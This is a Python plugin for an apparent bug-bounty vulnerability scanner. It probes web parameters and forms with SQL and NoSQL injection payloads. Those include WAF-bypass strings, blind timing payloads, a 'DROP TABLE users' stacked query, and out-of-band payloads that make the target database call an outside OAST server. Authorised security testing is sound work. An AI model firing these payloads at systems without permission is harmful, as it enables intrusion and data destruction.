"""
Advanced SQL Injection Plugin
Supports: MySQL, PostgreSQL, MSSQL, Oracle, SQLite
Includes: WAF bypass, NoSQL injection, second-order SQLi
"""
import asyncio
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
from scanner.plugins.base import BasePlugin
import difflib

# ============= ERROR-BASED PAYLOADS =============
ERROR_BASED_PAYLOADS = [
    # Basic quotes
    "'", "''", "`", "``", "\"", "\"\"",

    # Classic injections
    "' OR 1=1 --", "\" OR 1=1 --", "OR 1=1 --",
    "' OR 'a'='a", "\" OR \"a\"=\"a\"", "OR 'a'='a",

    # MySQL specific
    "' OR 1=1#", "' OR 1=1/*", "' OR 1=1;%00",
    "' AND 1=0 UNION SELECT NULL,NULL,NULL#",
    "' AND extractvalue(1,concat(0x7e,version()))#",
    "' AND updatexml(1,concat(0x7e,version()),1)#",

    # PostgreSQL specific
    "' OR 1=1--", "' AND 1=0 UNION SELECT NULL::text,NULL::text--",
    "' AND 1=CAST(version() AS int)--",

    # MSSQL specific
    "' OR 1=1;--", "' AND 1=CONVERT(int,@@version)--",
    "' UNION SELECT NULL,NULL,NULL--",

    # Oracle specific
    "' OR 1=1--", "' AND 1=0 UNION SELECT NULL,NULL FROM dual--",
    "' AND 1=CAST(version() AS int)--",

    # WAF bypass - case variation
    "' oR 1=1--", "' Or 1=1--", "' OR 1=1--",

    # WAF bypass - encoding
    "%27%20OR%201=1--",  # URL encoded
    "&#39; OR 1=1--",    # HTML encoded
    "\\' OR 1=1--",       # Escaped

    # WAF bypass - comments
    "'/**/OR/**/1=1--",
    "'/*!OR*/1=1--",
    "' OR 1=1 --%20",

    # WAF bypass - alternative operators
    "' || '1'='1",
    "' && '1'='1",

    # Stack queries
    "'; DROP TABLE users--",
    "'; EXEC sp_executesql N'SELECT 1'--",

    # UNION based
    "' UNION SELECT NULL--",
    "' UNION ALL SELECT NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL--",

    # Second-order SQLi markers
    "admin'--",
    "1' OR '1'='1",
]

# ============= BOOLEAN-BASED PAYLOADS =============
BOOLEAN_BASED_PAYLOADS = {
    # Standard boolean
    "AND 1=1 --": "AND 1=2 --",
    "OR 1=1 --": "OR 1=2 --",
    "AND TRUE --": "AND FALSE --",

    # MySQL boolean
    "' AND 'a'='a": "' AND 'a'='b",
    "' AND SLEEP(0)='0": "' AND SLEEP(0)='1",

    # PostgreSQL boolean
    "' AND 1::int=1--": "' AND 1::int=2--",
    "' AND true--": "' AND false--",

    # MSSQL boolean
    "' AND 1=1;--": "' AND 1=2;--",

    # Oracle boolean
    "' AND 1=1--": "' AND 1=2--",
    "' AND ROWNUM=1--": "' AND ROWNUM=0--",

    # WAF bypass boolean
    "'/**/AND/**/'a'='a": "'/**/AND/**/'a'='b",
    "' AND ASCII(SUBSTRING((SELECT 1),1,1))=49--": "' AND ASCII(SUBSTRING((SELECT 1),1,1))=50--",
}

# ============= TIME-BASED PAYLOADS =============
TIME_BASED_PAYLOADS = {
    # MySQL
    "' AND SLEEP(5)--": 5,
    "' OR SLEEP(5)--": 5,
    "' AND BENCHMARK(5000000,MD5('A'))--": 5,
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--": 5,

    # PostgreSQL
    "' AND pg_sleep(5)--": 5,
    "' OR pg_sleep(5)--": 5,

    # MSSQL
    "'; WAITFOR DELAY '00:00:05'--": 5,
    "'; WAITFOR TIME '00:00:05'--": 5,

    # Oracle
    "' AND DBMS_LOCK.SLEEP(5)--": 5,

    # SQLite
    "' AND randomblob(500000000)--": 5,

    # WAF bypass time-based
    "'/**/AND/**/SLEEP(5)--": 5,
    "' AND SLEEP(5)='0": 5,
}

# ============= NOSQL INJECTION PAYLOADS =============
NOSQL_PAYLOADS = [
    # MongoDB
    "' || '1'=='1",
    "' || 1==1//",
    "{'$gt': ''}",
    "{'$ne': null}",
    "admin'||'1'=='1",

    # General NoSQL
    "true, $where: '1 == 1'",
    ", $where: '1 == 1'",
    "$where: '1 == 1'",
    "'; return true; var dummy='",
]

# Common SQL error messages - expanded
ERROR_MESSAGES = [
    # MySQL
    "you have an error in your sql syntax", "warning: mysql",
    "mysqli", "mysql_fetch", "mysql_num_rows",

    # PostgreSQL
    "postgresql", "psycopg2", "pg_query",
    "pg_exec()", "unterminated quoted string",

    # MSSQL
    "microsoft sql server", "odbc sql server driver",
    "sqlserver", "mssql", "unclosed quotation mark",

    # Oracle
    "oracle", "ora-", "oci_",
    "quoted string not properly terminated",

    # SQLite
    "sqlite", "sqlite3", "sql logic error",

    # General
    "syntax error", "sql syntax", "database error",
    "query failed", "invalid query",
]

# NoSQL error messages
NOSQL_ERROR_MESSAGES = [
    "mongodb", "mongo", "nosql",
    "cannot convert", "invalid bson",
    "unexpected identifier", "syntaxerror",
]

class Plugin(BasePlugin):
    """
    Advanced SQL Injection plugin with WAF bypass and NoSQL support
    """
    def __init__(self):
        self.name = "sqli"
        self.description = "Detects SQL and NoSQL injection vulnerabilities"
        self.waf_detected = False
        self.database_type = None

    async def _get_baseline(self, url, method, data, requester):
        """Get baseline response to reduce false positives"""
        try:
            if method == "post":
                response = await requester.post(url, data=data)
            else:
                response = await requester.get(url, params=data)
            return response
        except Exception:
            return None

    def _detect_waf(self, response):
        """Detect if WAF is present"""
        if not response or not isinstance(response, dict):
            return False

        headers = response.get("headers", {})
        content = (response.get("text") or "").lower()

        waf_signatures = {
            "cloudflare": ["cf-ray", "cloudflare"],
            "akamai": ["akamaighost"],
            "imperva": ["incapsula", "_incap_"],
            "aws-waf": ["x-amzn"],
            "fortiweb": ["fortigate"],
            "barracuda": ["barra"],
        }

        for waf_name, signatures in waf_signatures.items():
            for sig in signatures:
                if sig.lower() in str(headers).lower() or sig in content:
                    self.waf_detected = True
                    return waf_name
        return None

    def _responses_similar(self, resp1, resp2, threshold=0.9):
        """Check if two responses are similar (to detect dynamic content)"""
        if not resp1 or not resp2:
            return False

        text1 = (resp1.get("text") or "")[:5000]  # Compare first 5000 chars
        text2 = (resp2.get("text") or "")[:5000]

        # Use difflib to compare
        similarity = difflib.SequenceMatcher(None, text1, text2).ratio()
        return similarity >= threshold

    async def _test_error_based(self, url, method, data, requester):
        # Get baseline
        baseline = await self._get_baseline(url, method, data, requester)

        for payload in ERROR_BASED_PAYLOADS[:20]:  # Limit to 20 for performance
            try:
                if method == "post":
                    response = await requester.post(url, data={k: payload for k in data.keys()})
                else:
                    response = await requester.get(url, params={k: payload for k in data.keys()})

                if not response or not isinstance(response, dict):
                    continue

                # Check for WAF
                waf = self._detect_waf(response)
                if waf and not self.waf_detected:
                    self.waf_detected = True

                content = response.get("text") or ""
                status_code = response.get("status", 200)

                # Check for SQL errors
                for error in ERROR_MESSAGES:
                    if error in content.lower():
                        # Verify it's different from baseline
                        if baseline and not self._responses_similar(baseline, response, threshold=0.85):
                            # Try to identify database type
                            if "mysql" in content.lower():
                                self.database_type = "MySQL"
                            elif "postgresql" in content.lower():
                                self.database_type = "PostgreSQL"
                            elif "mssql" in content.lower() or "microsoft" in content.lower():
                                self.database_type = "MSSQL"
                            elif "oracle" in content.lower():
                                self.database_type = "Oracle"

                            return {
                                "type": "error_based_sqli",
                                "payload": payload,
                                "error_found": error,
                                "database": self.database_type or "Unknown",
                                "waf_detected": self.waf_detected,
                                "message": f"Error-based SQLi detected ({self.database_type or 'Unknown DB'})",
                                "severity": "high",
                                "confidence": "firm",
                                "impact": "Database structure and data can be extracted",
                                "bounty_potential": "$500 - $10,000+"
                            }

                # Check for abnormal status codes (500, 502, etc)
                if status_code >= 500:
                    if baseline and baseline.get("status", 200) < 500:
                        return {
                            "type": "error_based_sqli",
                            "payload": payload,
                            "message": f"SQL injection caused server error (HTTP {status_code})",
                            "severity": "high",
                            "confidence": "tentative",
                            "waf_detected": self.waf_detected,
                            "bounty_potential": "$500 - $5,000+"
                        }

            except Exception:
                pass

        return None

    async def _test_boolean_based(self, url, method, data, requester):
        """Test for boolean-based blind SQL injection with improved detection"""

        for true_payload, false_payload in list(BOOLEAN_BASED_PAYLOADS.items())[:10]:  # Test top 10
            try:
                # Send TRUE condition
                if method == "post":
                    true_response = await requester.post(url, data={k: true_payload for k in data.keys()})
                else:
                    true_response = await requester.get(url, params={k: true_payload for k in data.keys()})

                # Send FALSE condition
                if method == "post":
                    false_response = await requester.post(url, data={k: false_payload for k in data.keys()})
                else:
                    false_response = await requester.get(url, params={k: false_payload for k in data.keys()})

                if not true_response or not false_response:
                    continue

                true_content = true_response.get("text") or ""
                false_content = false_response.get("text") or ""
                true_len = len(true_content)
                false_len = len(false_content)

                # Check if responses are significantly different (not just timestamps/tokens)
                # Use multiple heuristics
                length_diff = abs(true_len - false_len)
                content_different = not self._responses_similar(true_response, false_response, threshold=0.95)

                # Boolean SQLi confirmed if:
                # 1. Content length differs by more than 50 bytes
                # 2. OR content is semantically different
                if length_diff > 50 or (content_different and length_diff > 10):
                    # Verify with a second test to reduce false positives
                    if method == "post":
                        verify_true = await requester.post(url, data={k: true_payload for k in data.keys()})
                    else:
                        verify_true = await requester.get(url, params={k: true_payload for k in data.keys()})

                    verify_content = (verify_true.get("text") or "") if verify_true else ""

                    # Verify that TRUE responses are consistent
                    if self._responses_similar(true_response, verify_true, threshold=0.90):
                        return {
                            "type": "boolean_based_blind_sqli",
                            "payload_true": true_payload,
                            "payload_false": false_payload,
                            "message": "Boolean-based blind SQLi detected (differential responses)",
                            "true_response_len": true_len,
                            "false_response_len": false_len,
                            "difference": length_diff,
                            "severity": "high",
                            "confidence": "firm",
                            "impact": "Entire database can be extracted byte-by-byte",
                            "bounty_potential": "$1,000 - $15,000+",
                            "waf_detected": self.waf_detected
                        }

            except Exception:
                pass

        return None

    async def _test_time_based(self, url, method, data, requester):
        """Test for time-based blind SQL injection with baseline timing"""

        # Establish baseline timing (3 requests)
        baseline_times = []
        for _ in range(3):
            try:
                start = asyncio.get_event_loop().time()
                if method == "post":
                    await requester.post(url, data=data)
                else:
                    await requester.get(url, params=data)
                baseline_times.append(asyncio.get_event_loop().time() - start)
            except Exception:
                pass

        if not baseline_times:
            return None

        baseline_avg = sum(baseline_times) / len(baseline_times)
        baseline_max = max(baseline_times)

        # Test time-based payloads
        for payload, expected_delay in list(TIME_BASED_PAYLOADS.items())[:6]:  # Test top 6
            try:
                start_time = asyncio.get_event_loop().time()
                if method == "post":
                    await requester.post(url, data={k: payload for k in data.keys()})
                else:
                    await requester.get(url, params={k: payload for k in data.keys()})
                elapsed = asyncio.get_event_loop().time() - start_time

                # Vulnerability confirmed if response time is:
                # 1. Greater than baseline + expected_delay
                # 2. AND at least 2x baseline average
                time_threshold = baseline_avg + expected_delay - 1  # -1 for network variance

                if elapsed >= time_threshold and elapsed >= (baseline_avg * 2):
                    # Verify with second request
                    verify_start = asyncio.get_event_loop().time()
                    if method == "post":
                        await requester.post(url, data={k: payload for k in data.keys()})
                    else:
                        await requester.get(url, params={k: payload for k in data.keys()})
                    verify_elapsed = asyncio.get_event_loop().time() - verify_start

                    # Both requests should be slow
                    if verify_elapsed >= time_threshold:
                        return {
                            "type": "time_based_blind_sqli",
                            "payload": payload,
                            "message": f"Time-based blind SQLi detected (delay: {elapsed:.2f}s)",
                            "baseline_avg": f"{baseline_avg:.2f}s",
                            "injected_time": f"{elapsed:.2f}s",
                            "verify_time": f"{verify_elapsed:.2f}s",
                            "severity": "high",
                            "confidence": "firm",
                            "impact": "Entire database can be extracted (slower than boolean-based)",
                            "bounty_potential": "$1,000 - $15,000+",
                            "waf_detected": self.waf_detected
                        }

            except Exception:
                pass

        return None

    async def _test_nosql(self, url, method, data, requester):
        """Test for NoSQL injection vulnerabilities"""

        for payload in NOSQL_PAYLOADS:
            try:
                if method == "post":
                    response = await requester.post(url, data={k: payload for k in data.keys()})
                else:
                    response = await requester.get(url, params={k: payload for k in data.keys()})

                if not response or not isinstance(response, dict):
                    continue

                content = response.get("text") or ""

                # Check for NoSQL errors
                for error in NOSQL_ERROR_MESSAGES:
                    if error in content.lower():
                        return {
                            "type": "nosql_injection",
                            "payload": payload,
                            "error_found": error,
                            "message": "NoSQL injection detected (likely MongoDB)",
                            "severity": "high",
                            "confidence": "firm",
                            "impact": "NoSQL database bypass, potential data extraction",
                            "bounty_potential": "$1,000 - $10,000+",
                        }

                # Check for authentication bypass indicators
                status_code = response.get("status", 200)
                if status_code in [200, 302] and ("dashboard" in content.lower() or
                                                   "welcome" in content.lower() or
                                                   "logout" in content.lower()):
                    return {
                        "type": "nosql_auth_bypass",
                        "payload": payload,
                        "message": "Potential NoSQL authentication bypass detected",
                        "severity": "critical",
                        "confidence": "tentative",
                        "impact": "Authentication can be bypassed",
                        "bounty_potential": "$2,000 - $25,000+",
                    }

            except Exception:
                pass

        return None

    async def _test_oast_based(self, url, method, data, requester, oast_server):
        if not oast_server:
            return None

        OAST_PAYLOADS = [
            f"' OR 1=1 AND (SELECT a FROM (SELECT a=1) a JOIN (SELECT a=1) b WHERE a=1 AND (SELECT UTL_HTTP.REQUEST('{oast_server}'))=1) --", # Oracle
            f"' OR 1=1 AND (SELECT master..xp_dirtree('\\\\{oast_server}\\\\test')) --", # MSSQL
        ]

        for payload in OAST_PAYLOADS:
            try:
                if method == "post":
                    await requester.post(url, data={k: payload for k in data.keys()})
                else:
                    await requester.get(url, params={k: payload for k in data.keys()})
                
                return {
                    "type": "oast_based_sqli",
                    "payload": payload,
                    "message": "OAST-based SQLi payload sent. Check your OAST server for interactions.",
                    "severity": "high",
                    "confidence": "firm",
                }
            except Exception:
                pass
        return None

    async def run(self, target: str, requester, oast_server: str = None):
        """Main entry point - test for SQL and NoSQL injection"""
        vulnerabilities = []

        # 1. Test URL parameters
        parsed_url = urlparse(target)
        query_params = parse_qs(parsed_url.query)
        for param, values in query_params.items():
            original_value = values[0]

            # Test SQL injection
            for test_func in [self._test_error_based, self._test_boolean_based, self._test_time_based]:
                res = await test_func(target, "get", {param: original_value}, requester)
                if res:
                    res["context"] = f"URL parameter '{param}' at {target}"
                    res["param"] = param
                    vulnerabilities.append(res)

            # Test NoSQL injection
            res = await self._test_nosql(target, "get", {param: original_value}, requester)
            if res:
                res["context"] = f"URL parameter '{param}' at {target}"
                res["param"] = param
                vulnerabilities.append(res)

            # Test OAST-based
            res = await self._test_oast_based(target, "get", {param: original_value}, requester, oast_server)
            if res:
                res["context"] = f"URL parameter '{param}' at {target}"
                res["param"] = param
                vulnerabilities.append(res)

        # 2. Test forms
        try:
            response = await requester.get(target)
            if not response or not isinstance(response, dict):
                raise ValueError("No response")
            soup = BeautifulSoup(response.get("text") or "", "html.parser")
            forms = soup.find_all("form")
        except Exception:
            forms = []

        for form in forms:
            action = form.get("action")
            method = form.get("method", "get").lower()
            inputs = form.find_all(["input", "textarea", "select"])
            form_url = urljoin(target, action)

            data = {i.get("name"): "test" for i in inputs if i.get("name")}
            if not data:
                continue

            # Test SQL injection in forms
            for test_func in [self._test_error_based, self._test_boolean_based, self._test_time_based]:
                res = await test_func(form_url, method, data, requester)
                if res:
                    res["context"] = f"Form at {form_url}"
                    res["form_fields"] = list(data.keys())
                    vulnerabilities.append(res)

            # Test NoSQL injection in forms
            res = await self._test_nosql(form_url, method, data, requester)
            if res:
                res["context"] = f"Form at {form_url}"
                res["form_fields"] = list(data.keys())
                vulnerabilities.append(res)

            # Test OAST-based in forms
            res = await self._test_oast_based(form_url, method, data, requester, oast_server)
            if res:
                res["context"] = f"Form at {form_url}"
                res["form_fields"] = list(data.keys())
                vulnerabilities.append(res)

        return vulnerabilities
